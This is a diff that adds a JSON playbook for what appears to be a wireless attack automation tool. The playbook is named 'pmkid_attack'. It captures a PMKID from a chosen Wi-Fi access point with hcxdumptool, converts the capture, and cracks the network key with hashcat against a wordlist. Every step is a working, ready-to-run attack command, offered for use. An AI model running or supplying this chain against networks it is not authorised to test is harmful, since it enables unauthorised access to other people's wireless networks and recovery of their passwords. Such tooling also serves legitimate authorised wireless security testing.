@@ -1,0 +1,63 @@
+{
+  "name": "pmkid_attack",
+  "description": "PMKID clientless attack: capture PMKID from AP without any connected clients using hcxdumptool, then crack with hashcat.",
+  "author": "james-linux",
+  "version": "1.0",
+  "requires_root": true,
+  "steps": [
+    {
+      "id": "check_kill",
+      "action": "aircrack.check_kill",
+      "description": "Kill interfering processes (NetworkManager, wpa_supplicant)"
+    },
+    {
+      "id": "monitor_on",
+      "action": "aircrack.enable_monitor",
+      "params": {"interface": "{{interface}}"},
+      "description": "Enable monitor mode"
+    },
+    {
+      "id": "pmkid_capture",
+      "action": "layer.run",
+      "params": {
+        "command": "timeout 60 hcxdumptool -i {{monitor_interface}} -o /tmp/james_pmkid.pcapng --filterlist_ap={{target_bssid}} --filtermode=2 --enable_status=1",
+        "timeout": 75,
+        "sudo": true
+      },
+      "description": "Capture PMKID from target AP (60 second window)"
+    },
+    {
+      "id": "convert_hash",
+      "action": "layer.run",
+      "params": {
+        "command": "hcxpcapngtool -o /tmp/james_pmkid_hash.22000 /tmp/james_pmkid.pcapng",
+        "timeout": 15
+      },
+      "description": "Convert pcapng capture to hashcat 22000 format"
+    },
+    {
+      "id": "crack_pmkid",
+      "action": "layer.run",
+      "params": {
+        "command": "hashcat -m 22000 /tmp/james_pmkid_hash.22000 {{wordlist}} --force -o /tmp/james_pmkid_cracked.txt",
+        "timeout": 1800
+      },
+      "description": "Crack PMKID hash with hashcat (mode 22000)"
+    },
+    {
+      "id": "show_result",
+      "action": "layer.run",
+      "params": {
+        "command": "echo '=== CRACKED ===' && cat /tmp/james_pmkid_cracked.txt 2>/dev/null || echo 'No key found in wordlist'",
+        "timeout": 5
+      },
+      "description": "Display cracked result"
+    },
+    {
+      "id": "monitor_off",
+      "action": "aircrack.disable_monitor",
+      "params": {"interface": "{{monitor_interface}}"},
+      "description": "Restore managed mode"
+    }
+  ]
+}
